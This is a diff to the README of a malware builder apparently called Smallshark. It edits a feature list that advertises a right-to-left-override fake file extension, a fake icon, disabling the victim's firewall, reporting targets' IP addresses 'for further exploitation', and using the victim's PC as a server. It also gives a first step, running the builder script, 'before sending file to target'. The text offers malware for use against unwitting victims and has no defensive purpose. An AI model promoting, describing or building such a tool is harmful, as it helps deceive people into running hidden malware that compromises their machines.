@@ -4,13 +4,12 @@
 
 ### Features:
 
-- Fake file extension (RTLO Attack) (Turns .exe file to .mp4 file)
+- Fake file extension (RTLO Attack) (.mp4 disguises as .exe file)
 - Fake file icon
-- Disables victim firewall
-- Sends you real ip address of targets who downloaded this ghost malware using Darknet
-- No port forwarding (Uses Victim's PC As C&C Server)
-- FUD (Fully undetectable)
-- Builder script both works with Windows and Linux
+- Deactivates target's firewall
+- Sends you ip address of targets who downloaded this file for further exploitation
+- No port forwarding (Uses target's PC as server)
+- Builder script both works on Windows and Linux
 
 ### Before sending file to target :
 - 1 Run python3 Smallshark.py
